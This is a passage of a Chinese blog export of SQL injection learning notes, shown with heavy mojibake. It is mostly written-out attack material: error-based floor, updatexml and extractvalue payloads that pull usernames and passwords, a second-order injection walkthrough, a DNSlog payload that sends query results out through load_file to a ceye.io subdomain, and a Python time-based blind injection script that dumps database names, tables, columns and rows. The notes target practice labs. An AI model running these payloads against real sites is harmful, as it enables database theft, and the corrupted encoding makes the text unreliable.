ç¬¬ä¸€ä¸ªè¿”å›æ­£ç¡®ï¼Œç¬¬äºŒä¸ªè¿”å›é”™è¯¯å­˜åœ¨æ³¨å…¥ã€‚ 123admin&#x27;) and 1=1 #ç¼–ç å:YWRtaW4nKSBhbmQgMT0xICM= 123admin&#x27;) and 1=2 #ç¼–ç å:YWRtaW4nKSBhbmQgMT0yICM= è¿™é‡Œè¯•ä¸‹æŠ¥é”™æ³¨å…¥ 12&#x27;) and extractvalue(1,concat(0x7e,database(),0x7e)) #JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpICM= é€šè¿‡sqlmapä¸­è½¬æ³¨å…¥ï¼Œå°†payloadç¼–ç ä¸ºbase64 12345678&lt;?php$url=&#x27;http://xxxx/job_bystjb/yjs_byszjs.asp?id=&#x27;;$payload=base64_encode($_GET[&#x27;x&#x27;]);echo $payload;$urls=$url.$payload;file_get_contents($urls);echo $urls;?&gt; äºŒæ¬¡æ³¨å…¥åŸç† â€‹ äºŒæ¬¡æ³¨å…¥æ˜¯å­˜å‚¨å‹æ³¨å…¥ï¼Œå¯ä»¥ç†è§£ä¸ºæ„é€ æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°äº†SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚è¯¦ç»†ç‚¹æ¥è®²ï¼Œå°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº† addslashes æˆ–è€…æ˜¯å€ŸåŠ© get_magic_quotes_gpc å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«è¿˜æ˜¯è„æ•°æ®ã€‚åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚äºŒæ¬¡æ³¨å…¥æ— æ³•é€šè¿‡æ‰«æå·¥å…·æˆ–è€…ä»£ç è‡ªå·±æ‰‹å·¥æµ‹è¯•å‡ºæ¥çš„ï¼ŒäºŒæ¬¡æ³¨å…¥ä¸€èˆ¬ä¼šäº§ç”Ÿåœ¨ç½‘ç«™ç¨‹åºæºä»£ç æ‰ä¼šå‘ç°çš„æ³¨å…¥æ¼æ´ï¼Œä»å‰ç«¯æˆ–è€…é»‘ç›’æµ‹è¯•æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªæ¼æ´çš„ã€‚ äº§ç”ŸäºŒæ¬¡æ³¨å…¥ä¸€èˆ¬äº§ç”Ÿåœ¨æœ‰ç™»å½•æ³¨å†Œé¡µé¢è¿™é‡Œ é™åˆ¶æœ‰æ—¶å€™ç½‘é¡µä¼šé€šè¿‡é™åˆ¶è¾“å…¥é•¿åº¦æ¥é™åˆ¶æˆ‘ä»¬ï¼Œå¦‚æœæ˜¯å‰ç«¯é™åˆ¶çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å°†é™åˆ¶ä¿®æ”¹æ‰ï¼Œå¦‚æœæ˜¯åç«¯ï¼Œé‚£æ²¡åŠæ³•äº†ã€‚ ä¾‹å­1http://127.0.0.1/sqli/Less-24/ æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªadminâ€™#çš„ç”¨æˆ· ç„¶åæˆ‘ä»¬ç™»å½• å°†å¯†ç ä¿®æ”¹ä¸ºadminæ­¤æ—¶æ•°æ®åº“ä¸­adminçš„å¯†ç ä¸º1234 å¯ä»¥çœ‹åˆ°adminçš„å¯†ç è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºadminï¼Œè¿™æ ·å°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ï¼Œæˆ‘ä»¬è¯•è¯•æŠ¥é”™æ³¨å…¥ 1&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) # æ²¡æˆåŠŸï¼Œæ•°æ®åº“é™åˆ¶äº†é•¿åº¦ï¼Œè¯•è¯•å¯†ç èƒ½æ³¨å…¥ä¸ï¼Œä¹Ÿä¸èƒ½ã€‚ åŸç†å°±æ˜¯è¿™æ ·ã€‚ DNSlogæ³¨å…¥åŸç†é¦–å…ˆéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥é…ç½®çš„åŸŸåï¼Œæ¯”å¦‚ï¼šceye.ioï¼Œç„¶åé€šè¿‡ä»£ç†å•†è®¾ç½®åŸŸå ceye.io çš„ nameserver ä¸ºè‡ªå·±çš„æœåŠ¡å™¨ Aï¼Œç„¶åå†æœåŠ¡å™¨ A ä¸Šé…ç½®å¥½ DNS Serverï¼Œè¿™æ ·ä»¥æ¥æ‰€æœ‰ ceye.io åŠå…¶å­åŸŸåçš„æŸ¥è¯¢éƒ½ä¼šåˆ° æœåŠ¡å™¨ A ä¸Šï¼Œè¿™æ—¶å°±èƒ½å¤Ÿå®æ—¶åœ°ç›‘æ§åŸŸåæŸ¥è¯¢è¯·æ±‚äº†ã€‚DNSåœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œå’±ä»¬è¿™ä¸ªå°±æ˜¯è¯»å–å¤šçº§åŸŸåçš„è§£ææ—¥å¿—ï¼Œæ¥è·å–ä¿¡æ¯ã€‚ç®€å•æ¥è¯´å°±æ˜¯æŠŠä¿¡æ¯æ”¾åœ¨é«˜çº§åŸŸåä¸­ï¼Œä¼ é€’åˆ°è‡ªå·±è¿™ï¼Œç„¶åè¯»å–æ—¥å¿—ï¼Œè·å–ä¿¡æ¯ UNCUNCï¼ˆUniversal Naming Conventionï¼‰ï¼šé€šç”¨å‘½åè§„åˆ™ï¼Œä¹Ÿç§°é€šç”¨å‘½åè§„èŒƒã€é€šç”¨å‘½åçº¦å®šã€‚UNCä¸ºç½‘ç»œï¼ˆä¸»è¦æŒ‡å±€åŸŸç½‘ï¼‰ä¸Šèµ„æºçš„å®Œæ•´Windowsåç§°ã€‚UNCè·¯å¾„æ ¼å¼ï¼š\\servername\\sharenameï¼Œå…¶ä¸­servernameæ˜¯æœåŠ¡å™¨åã€‚sharenameæ˜¯å…±äº«èµ„æºçš„åç§°ã€‚ç›®å½•æˆ–æ–‡ä»¶çš„UNCåç§°å¯ä»¥åŒ…æ‹¬å…±äº«åç§°ä¸‹çš„ç›®å½•è·¯å¾„ï¼Œæ ¼å¼ä¸ºï¼š\\servername\\sharename\\directory\\filenameã€‚ç”±äºåæ–œæ çš„è½¬ä¹‰æ•ˆæœï¼Œè¯­å¥ä¸­è¾“å…¥çš„å››ä¸ªåæ–œæ  ï¼ˆ\\\\ï¼‰ï¼Œåœ¨è½¬ä¹‰åå¾—åˆ°ï¼ˆ\\ï¼‰ã€‚å®é™…æ‰§è¡Œçš„åªæœ‰ä¸¤ä¸ªåå¼•å·ã€‚ æµç¨‹concatå‡½æ•°å°†æ‰§è¡Œç»“æœä¸è·å–åˆ°çš„åŸŸåï¼ˆXXX.ceye.io\\abcï¼‰æ‹¼æ¥ï¼Œæ„æˆä¸€ä¸ªæ–°çš„åŸŸåï¼Œ load_file()å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œé‚£ä¹ˆè¿™ä¸€æ¡å¸¦æœ‰æ•°æ®åº“æŸ¥è¯¢ç»“æœçš„åŸŸåå°±è¢«æäº¤åˆ°DNSæœåŠ¡å™¨è¿›è¡Œè§£æï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹DNSè§£æè®°å½•å°±å¯ä»¥å¾—åˆ°sqlæŸ¥è¯¢ç»“æœ æ³¨æ„1234windowsï¼š load_file()æŸ¥çœ‹mysqlè¯»å–æƒé™ã€‚show variables like &#x27;%secure%&#x27;;secure_file_privé¡¹ä¸ºç©ºæ‰å¯ä»¥ä½¿ç”¨load_fil()å‡½æ•°ï¼Œåœ¨mysql.iniä¸­æ·»åŠ  secure_file_priv=&#x27;&#x27; åˆ©ç”¨åœºæ™¯åœ¨sqlæ³¨å…¥æ—¶ä¸ºå¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ï¼Œæ³¨å…¥çš„æ•ˆç‡ä½ä¸”çº¿ç¨‹é«˜å®¹æ˜“è¢«wafæ‹¦æˆªï¼Œåˆæˆ–è€…æ˜¯ç›®æ ‡ç«™ç‚¹æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬åœ¨è¯»å–æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤æ³¨å…¥ç­‰æ“ä½œæ—¶æ— æ³•æ˜æ˜¾çš„ç¡®è®¤æ˜¯å¦åˆ©ç”¨æˆåŠŸï¼Œè¿™æ—¶å€™å°±è¦ç”¨åˆ°æˆ‘ä»¬çš„DNSlogæ³¨å…¥ã€‚ æ¨èå¹³å°123http://ceye.io/ï¼ˆéœ€è¦æ³¨å†Œï¼‰ http://www.dnslog.cnhttp://admin.dnslog.link ä¾‹å­1http://127.0.0.1/sqli/Less-9/ 1http://127.0.0.1/sqli/Less-9/?id=-1&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.nd91wz.ceye.io\\\\abc&#x27;))),1,0)--+ &quot;\\\\\\\\&quot; å››ä¸ª\\ä¸èƒ½å°‘ æ³¨æ„.xxxx.ceye.ioæ˜¯ä½ çš„å­åŸŸåï¼Œå‰é¢è¦åŠ ä¸ª. åé¢çš„\\\\xxxï¼Œ\\\\æ˜¯å¿…é¡»çš„ï¼Œ`xxxè¿™éƒ¨åˆ†éšä¾¿æ˜¯ä»€ä¹ˆå†…å®¹ï¼Œä¸èƒ½ä¸ºç©ºã€‚ å·¥å…·ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…· 1https://github.com/adooo/dnslogsqlinj","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"16WEBæ¼æ´--SQLæ³¨å…¥ä¹‹æŸ¥è¯¢æ–¹å¼åŠæŠ¥é”™ç›²æ³¨","slug":"16WEBæ¼æ´-SQLæ³¨å…¥ä¹‹æŸ¥è¯¢æ–¹å¼åŠæŠ¥é”™ç›²æ³¨","date":"2021-09-21T02:29:31.000Z","updated":"2021-09-21T06:05:19.803Z","comments":true,"path":"2021/09/21/16WEBæ¼æ´-SQLæ³¨å…¥ä¹‹æŸ¥è¯¢æ–¹å¼åŠæŠ¥é”™ç›²æ³¨/","link":"","permalink":"https://al0nez.github.io/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€å½“è¿›è¡Œ SQL æ³¨å…¥æ—¶ï¼Œæœ‰å¾ˆå¤šæ³¨å…¥ä¼šå‡ºç°æ— å›æ˜¾çš„æƒ…å†µï¼Œå…¶ä¸­ä¸å›æ˜¾çš„åŸå› å¯èƒ½æ˜¯ SQL è¯­å¥æŸ¥è¯¢æ–¹å¼çš„é—®é¢˜å¯¼è‡´ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ç”¨åˆ°ç›¸å…³çš„æŠ¥é”™æˆ–ç›²æ³¨è¿›è¡Œåç»­æ“ä½œï¼ŒåŒæ—¶ä½œä¸ºæ‰‹å·¥æ³¨å…¥æ—¶ï¼Œæå‰äº†è§£æˆ–é¢„çŸ¥å…¶SQL è¯­å¥å¤§æ¦‚å†™æ³•ä¹Ÿèƒ½æ›´å¥½çš„é€‰æ‹©å¯¹åº”çš„æ³¨å…¥è¯­å¥ã€‚ æ•°æ®åº“æ“ä½œæŸ¥åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢æ•ˆæœ 1select åˆ—åç§° æˆ– * from è¡¨åç§° where å­—æ®µ1=&#x27;æ¡ä»¶1&#x27; and å­—æ®µ2=&#x27;æ¡ä»¶2&#x27; å¢åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œç”¨æˆ·æ³¨å†Œæ·»åŠ ç­‰æ“ä½œ 1insert into table name(åˆ—1,åˆ—2 ...) values(å€¼1,å€¼2) æ”¹ä¼šå‘˜æˆ–åå°ä¸­å¿ƒæ•°æ®åŒæ­¥æˆ–ç¼“å­˜ç­‰æ“ä½œ 1update è¡¨åç§° set åˆ—åç§°=æ–°å€¼ where åˆ—åç§°=æŸå€¼ åˆ åå°ç®¡ç†é‡Œé¢åˆ é™¤æ–‡ç« åˆ é™¤ç”¨æˆ·ç­‰æ“ä½œ 1delete from è¡¨åç§° where åˆ—åç§°=å€¼ order by æ’åºæ•°æ®ä¸€èˆ¬ç»“åˆè¡¨åæˆ–åˆ—åè¿›è¡Œæ•°æ®æ’åºæ“ä½œ 1select åˆ—åç§° æˆ– * from è¡¨åç§° order by åˆ—å é‡ç‚¹ç†è§£ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸ŠæŸ¥è¯¢æ–¹å¼ä¸ç½‘ç«™åº”ç”¨çš„å…³ç³» æ³¨å…¥ç‚¹äº§ç”Ÿåœ°æ–¹æˆ–åº”ç”¨çŒœæµ‹åˆ°å¯¹æ–¹çš„ SQL æŸ¥è¯¢æ–¹å¼ SQL æ³¨å…¥æŠ¥é”™ç›²æ³¨ç›²æ³¨å°±æ˜¯åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œè·å–çš„æ•°æ®ä¸èƒ½å›æ˜¾è‡³å‰ç«¯é¡µé¢ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç›²æ³¨ã€‚æˆ‘ä»¬å¯ä»¥çŸ¥é“ç›²æ³¨åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š åŸºäºå¸ƒå°”çš„ SQL ç›²æ³¨-é€»è¾‘åˆ¤æ–­ 1regexp,like,ascii,left,ord,mid åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨-å»¶æ—¶åˆ¤æ–­ 1if,sleep åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨-æŠ¥é”™å›æ˜¾ 1floorï¼Œupdatexmlï¼Œextractvalue åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨-æŠ¥é”™å›æ˜¾1å¸¸ç”¨æŠ¥é”™æ³¨å…¥å‡½æ•°:floorï¼Œupdatexmlï¼Œextractvalue flooræŠ¥é”™æ³¨å…¥ï¼ˆ64æ˜¾ç¤ºä½é™åˆ¶ï¼‰åŸç† 12https://blog.csdn.net/zpy1998zpy/article/details/80650540https://www.freebuf.com/column/235496.html payload å°è¿ªè®²çš„é‚£ä¸ªæœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘ç®€åŒ–äº†ä¸€ä¸‹ æŸ¥æ•°æ®åº“ 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit æŸ¥è¡¨å 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit æŸ¥åˆ—å 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit æŸ¥æ•°æ® 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,concat(username,0x7e,password),0x7e) from pikachu.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit updatexmlæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰åŸç† 1https://blog.csdn.net/weixin_33881140/article/details/89565706 payload æŸ¥æ•°æ®åº“ 1username=3&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit æŸ¥è¡¨å 1username=3&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 3,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit æŸ¥åˆ—å 1username=3&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit æŸ¥æ•°æ® 1username=3&#x27;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from pikachu.users limit 0,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit extractvalueæŠ¥é”™æ³¨å…¥ï¼ˆ32æ˜¾ç¤ºä½é™åˆ¶ï¼‰åŸç† 1https://blog.csdn.net/weixin_33881140/article/details/89565706 payload æŸ¥æ•°æ®åº“ 1username=1 &#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit åé¢çš„å’Œupdatexmlå·®ä¸å¤šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯extractvalueåªæœ‰ä¿©ä¸ªå‚æ•° updateæ³¨å…¥åˆšæ‰ä¸Šé¢æ˜¯é€šè¿‡insertè¿›è¡Œçš„æ³¨å…¥ï¼Œè¿™é‡Œè¯•ä¸€ä¸‹updateï¼ŒåŸç†ä¸€æ ·è¿™é‡Œå°±æŸ¥ä¸€ä¸‹æ•°æ®åº“åï¼Œå…¶ä»–çš„çœ‹ä¸Šé¢ã€‚ floor1sex=a&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit updatexml1sex=a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit extractvalue1sex=a&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit deleteæ³¨å…¥GETæ–¹å¼çš„è¯ï¼Œå¦‚æœæ˜¯åœ¨burp suiteä¸­å»è¿›è¡Œæ³¨å…¥ï¼Œéœ€è¦å°†ç©ºæ ¼æ”¹ä¸ºåŠ å·æˆ–è€…%20ã€‚POSTåˆ™ä¸éœ€è¦ floor1http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) updatexml1http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and updatexml(1,concat(0x7e,database(),0x7e),1) extractvalue1http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and extractvalue(1,concat(0x7e,database(),0x7e)) åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨-å»¶æ—¶åˆ¤æ–­åŸºç¡€çŸ¥è¯†1234567891011like &#x27;ro%&#x27; #åˆ¤æ–­roæˆ–ro...æ˜¯å¦æˆç«‹regexp &#x27;^xiaodi[1-z]&#x27; #åŒ¹é…xiaodiåŠxiaodi...ç­‰if(æ¡ä»¶,5,0) #æ¡ä»¶æˆç«‹ï¼Œè¿”å›5ï¼Œåä¹‹ï¼Œè¿”å›0sleep(5) #SQLè¯­å¥å»¶æ—¶æ‰§è¡Œ5ç§’mid(a,b,c) #ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½substr(a,b,c) #ä»Bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦left(database(),1),database() #left(a,b)ä»å·¦ä¾§æˆªå–açš„å‰bä½length(database())=8 #åˆ¤æ–­æ•°æ®åº“database()åçš„é•¿åº¦ascii() å­—ç¬¦ä¸²è½¬æ¢asciiç ord asciiç è½¬æ¢ä¸ºæ•°å­—ord=ascii ascii(x)=97 #åˆ¤æ–­xçš„asciiç æ˜¯å¦ç­‰äº97 é¡µé¢é”™è¯¯å’Œæ­£ç¡®è¿”å›ä¸€æ ·ã€‚ä¸€èˆ¬éƒ½ç”¨è„šæœ¬è·‘ æŸ¥çœ‹æ•°æ®åº“1payloadï¼šif(ascii(substr(database(),1,1))=114,sleep(5),1) æŸ¥çœ‹è¡¨å 1and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+ è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253&#x27;&#x27;&#x27;author : L0ne1ytime : 2021-08-29&#x27;&#x27;&#x27;import requestsimport timedef close(url): s = input(&quot;è¯·è¾“å…¥é—­åˆæ–¹å¼:&quot;) url = url + s return urldef db_ascii_list(): ascii_list = [] for i in range(33, 127): ascii_list.append(chr(i)) return ascii_list# çˆ†ç ´æ•°æ®åº“ådef db_name(url, str, ascii_list): print(&quot;[-]å¼€å§‹çˆ†ç ´æ•°æ®åº“å.......&quot;) num = 1 while True: db_payload = url + &quot; and if(length(database())=%d,sleep(2),1) --+&quot; % num start_time = time.time() # print(db_payload) r = requests.get(db_payload) if time.time() - start_time &gt; 2: db_length = num break else: num += 1 # print(db_length) db_name = &#x27;&#x27; for i in range(1, db_length + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) db_name_payload = url + &quot; and if(ord(mid((database()),%d,1))&gt;%d,sleep(2),1) --+&quot; % (i, midx) # print(db_name_payload) start_time = time.time() r = requests.get(db_name_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx db_name += chr(max) print(&quot;[+]æ•°æ®åº“åï¼š%s\\n&quot; % db_name) return db_name# çˆ†ç ´è¡¨ådef tb_name(url, str, ascii_list, db_name): print(&quot;[-]å¼€å§‹çˆ†ç ´è¡¨å&quot;) i = 1 while True: tb_payload = url + &quot; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % ( db_name, i) # print(tb_payload) start_time = time.time() r = requests.get(tb_payload) if time.time() - start_time &gt; 2: tb_number = i break else: i += 1 j = 1 tb_name_length = [] for i in range(tb_number): while True: tb_name_length_payload = url + &quot; and if((select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % ( db_name, i, j) # print(tb_name_length_payload) start_time = time.time() r = requests.get(tb_name_length_payload) if time.time() - start_time &gt; 2: tb_name_length.append(j) j = 1 break else: j += 1 tb_name_list = [] for i in range(tb_number): tb_name = &#x27;&#x27; for j in range(1, tb_name_length[i] + 1): max = 127 min = 33 while abs((max - min)) &gt; 1: midx = int((max + min) / 2) tb_name_payload = url + &quot; and if(ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % ( db_name, i, j, midx) start_time = time.time() r = requests.get(tb_name_payload) # print(tb_name_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx tb_name += chr(max) tb_name_list.append(tb_name) print(&quot;\\n[+]%såº“ä¸‹çš„%då¼ è¡¨ä¸ºï¼š%s\\n&quot; % (db_name, tb_number, tb_name_list)) return tb_name_listdef column_name(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;è¯·è¾“å…¥ä½ é€‰æ‹©çš„è¡¨å(ä¾‹å¦‚ admin):&quot;) if tb_name in tb_name_list: break else: print(&quot;è¾“å…¥çš„è¡¨åæœ‰è¯¯,è¯·é‡æ–°è¾“å…¥&quot;) j = 1 while True: column_num_payload = url + &quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % ( tb_name, db_name, j) # print(column_num_payload) start_time = time.time() r = requests.get(column_num_payload) if time.time() - start_time &gt; 2: column_num = j break else: j += 1 column_name_length = [] k = 1 for j in range(column_num): while True: column_name_length_payload = url + &quot; and if((select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % ( tb_name, db_name, j, k) # print(column_name_length_payload) start_time = time.time() r = requests.get(column_name_length_payload) if time.time() - start_time &gt; 2: column_name_length.append(k) k = 1 break else: k += 1 print(&quot;[-]å¼€å§‹çˆ†ç ´%sè¡¨çš„å­—æ®µå:&quot; % tb_name) column_name_list = [] for i in range(len(column_name_length)): column_name = &#x27;&#x27; for j in range(1, column_name_length[i] + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) column_name_payload = url + &quot; and if(ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % ( tb_name, db_name, i, j, midx) # print(column_name_payload) start_time = time.time() r = requests.get(column_name_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx column_name += chr(max) column_name_list.append(column_name) print(&quot;[+]%sè¡¨çš„å­—æ®µååˆ†åˆ«ä¸º:%s&quot; % (tb_name, column_name_list)) return column_name_list, tb_namedef dump_data(url, str, tb_name, db_name, column_name_list): i = 1 while True: data_num_payload = url + &quot; and if((select count(*) from %s.%s)=%d,sleep(2),1) --+&quot; % ( db_name, tb_name, i) # print(data_num_payload) start_time = time.time() r = requests.get(data_num_payload) if time.time() - start_time &gt; 2: data_num = i break else: i += 1 print(&quot;[-]å¼€å§‹çˆ†ç ´%sæ•°æ®åº“çš„%sè¡¨ä¸­æ•°æ®:&quot; % (db_name, tb_name)) k = 1 data_length = [] 